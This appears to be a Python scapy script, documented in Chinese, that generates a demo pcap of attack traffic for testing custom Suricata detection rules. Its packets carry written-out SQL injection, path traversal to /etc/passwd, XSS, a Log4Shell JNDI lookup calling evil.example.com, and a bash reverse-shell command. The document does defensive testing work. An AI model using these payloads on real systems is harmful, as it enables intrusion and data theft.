"""生成用于验证的 pcap 文件（含攻击特征）。

═══════════════════════════════════════════════════════════════════
为什么自己生成而不是下载公开数据集
═══════════════════════════════════════════════════════════════════
1. **不依赖外部下载**：公开 pcap 数据集（CICIDS2017 官方）体积大
   （单日数 GB）且国内下载常受阻，演示与开发不该被此卡住。
2. **内容完全可控**：精确命中本项目自定义的规则，
   便于验证"规则是否按预期工作"。
3. **可复现**：一条命令重新生成，演示与测试都可重复。

真实公开数据集仍是评测的首选（见 data/raw/README.md 的说明），
本脚本用于**功能验证与演示**，两者互补。

═══════════════════════════════════════════════════════════════════
生成的攻击类型（对应 suricata/rules/custom.rules）
═══════════════════════════════════════════════════════════════════
    - SQL 注入（UNION SELECT / OR 1=1）
    - 目录穿越（/etc/passwd）
    - XSS（<script）
    - Log4Shell（${jndi:）
    - 反弹 shell（/bin/bash -i）
    - SSH 暴力破解（多次连接尝试）
    - TCP SYN 扫描（大量 SYN）
    - ICMP 扫描（大量 ping）
    - 正常流量（HTTP 请求、DNS 查询）—— 用于验证不误报

用法：
    uv run python scripts/generate_demo_pcap.py
    uv run python scripts/generate_demo_pcap.py --out data/raw/demo.pcap
"""

from __future__ import annotations

import argparse
import random
from pathlib import Path

from scapy.all import ICMP, IP, TCP, Raw, wrpcap

# 网络拓扑（与 suricata.yaml 的 HOME_NET 一致）
EXTERNAL_IP = "45.33.32.156"
INTERNAL_WEB = "192.168.10.5"
INTERNAL_DNS = "192.168.10.19"
INTERNAL_SSH = "192.168.10.12"

# 固定的随机种子 —— 每次生成相同内容，演示可复现
SEED = 42


def _tcp_session(src: str, dst: str, sport: int, dport: int, payload: bytes) -> list:
    """构造一个包含完整三次握手的 TCP 会话。

    ⚠️ 为什么必须模拟握手（实测踩过的坑）：
        本项目多数规则带 `flow:established,to_server` 条件，
        它要求 Suricata 看到**已建立的连接**。
        只发一个孤立的 PSH+ACK 数据包，Suricata 不认为会话已建立，
        应用层规则（http 等）完全不会触发 —— 实测只命中 threshold 类规则。

        完整会话序列：SYN → SYN-ACK → ACK → 数据 → FIN
        每步都需要正确的序列号/确认号，否则 Suricata 的流重组会失败。

    返回包列表，按顺序加入 pcap。
    """
    seq = 1000
    ack = 2000

    # 1. 客户端 SYN
    syn = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S", seq=seq)
    # 2. 服务端 SYN-ACK（确认客户端的 SYN）
    syn_ack = IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA", seq=ack, ack=seq + 1)
    # 3. 客户端 ACK（握手完成）
    ack_pkt = IP(src=src, dst=dst) / TCP(
        sport=sport, dport=dport, flags="A", seq=seq + 1, ack=ack + 1
    )
    # 4. 数据（带攻击载荷）——此时会话已建立，应用层规则可命中
    data = (
        IP(src=src, dst=dst)
        / TCP(sport=sport, dport=dport, flags="PA", seq=seq + 1, ack=ack + 1)
        / Raw(load=payload)
    )
    # 5. 结束会话
    fin = IP(src=src, dst=dst) / TCP(
        sport=sport, dport=dport, flags="FA", seq=seq + 1 + len(payload), ack=ack + 1
    )
    return [syn, syn_ack, ack_pkt, data, fin]


def build_packets() -> list:
    """构造全部测试包。"""
    rng = random.Random(SEED)
    packets: list = []

    def sport() -> int:
        return rng.randint(32768, 60999)

    # ── 1. 正常流量（验证不误报）──────────────────────────────
    for path in ("/", "/index.html", "/api/status", "/images/logo.png"):
        packets.extend(
            _tcp_session(
                EXTERNAL_IP,
                INTERNAL_WEB,
                sport(),
                80,
                f"GET {path} HTTP/1.1\r\nHost: example.com\r\n"
                f"User-Agent: Mozilla/5.0\r\n\r\n".encode(),
            )
        )

    # ── 2. SQL 注入 ───────────────────────────────────────────
    # 注意：URL 中的空格必须编码为 %20。
    # 未编码时 Suricata 会在第一个空格处截断请求行
    # （实测：`/search?q=1' UNION SELECT...` 被解析成 `/search?q=1'`），
    # 导致 http_uri 规则无法命中完整 payload。
    packets.extend(
        _tcp_session(
            EXTERNAL_IP,
            INTERNAL_WEB,
            sport(),
            80,
            b"GET /search?q=1'%20UNION%20SELECT%20username,password%20FROM%20users--"
            b" HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
    )
    packets.extend(
        _tcp_session(
            EXTERNAL_IP,
            INTERNAL_WEB,
            sport(),
            80,
            b"GET /login?user=admin'%20OR%201=1-- HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
    )

    # ── 3. 目录穿越 ───────────────────────────────────────────
    packets.extend(
        _tcp_session(
            EXTERNAL_IP,
            INTERNAL_WEB,
            sport(),
            80,
            b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
    )

    # ── 4. XSS ────────────────────────────────────────────────
    packets.extend(
        _tcp_session(
            EXTERNAL_IP,
            INTERNAL_WEB,
            sport(),
            80,
            b"GET /comment?text=<script>alert(1)</script> HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
    )

    # ── 5. Log4Shell ──────────────────────────────────────────
    packets.extend(
        _tcp_session(
            EXTERNAL_IP,
            INTERNAL_WEB,
            sport(),
            8080,
            b"GET / HTTP/1.1\r\nHost: example.com\r\n"
            b"X-Api-Version: ${jndi:ldap://evil.example.com/a}\r\n\r\n",
        )
    )

    # ── 6. 反弹 shell（出站）────────────────────────────────
    packets.extend(
        _tcp_session(
            INTERNAL_WEB,
            EXTERNAL_IP,
            sport(),
            4444,
            b"sh -c 'exec /bin/bash -i 2>&1'\n",
        )
    )

    # ── 7. SSH 暴力破解（多次连接尝试）──────────────────────
    for _i in range(8):
        # SSH 规则只匹配 content:"SSH-"，单包即可；但用完整会话更真实
        packets.extend(
            _tcp_session(
                EXTERNAL_IP,
                INTERNAL_SSH,
                sport(),
                22,
                b"SSH-2.0-OpenSSH_7.4\r\n",
            )
        )

    # ── 8. TCP SYN 扫描（大量 SYN，触发 threshold）──────────
    for port in range(1, 41):
        packets.append(
            IP(src=EXTERNAL_IP, dst=INTERNAL_WEB) / TCP(sport=sport(), dport=port, flags="S")
        )

    # ── 9. ICMP 扫描 ──────────────────────────────────────────
    for i in range(1, 13):
        packets.append(IP(src=EXTERNAL_IP, dst=f"192.168.10.{i}") / ICMP())

    return packets


def main() -> None:
    parser = argparse.ArgumentParser(description="生成含攻击特征的演示 pcap")
    parser.add_argument("--out", type=Path, default=Path("data/raw/demo-traffic.pcap"))
    args = parser.parse_args()

    packets = build_packets()
    args.out.parent.mkdir(parents=True, exist_ok=True)
    wrpcap(str(args.out), packets)

    size_kb = args.out.stat().st_size / 1024
    print(f"已生成 {len(packets)} 个数据包 → {args.out} ({size_kb:.1f} KB)")
    print()
    print("包含的攻击类型（预期被 custom.rules 命中）：")
    print("  - SQL 注入（UNION SELECT / OR 1=1）")
    print("  - 目录穿越（/etc/passwd）")
    print("  - XSS（script 标签）")
    print("  - Log4Shell（JNDI 注入）")
    print("  - 反弹 shell（出站 /bin/bash）")
    print("  - SSH 暴力破解（8 次尝试）")
    print("  - TCP SYN 扫描（40 个端口）")
    print("  - ICMP 扫描（12 个目标）")
    print("  - 正常 HTTP 流量（4 条，用于验证不误报）")


if __name__ == "__main__":
    main()
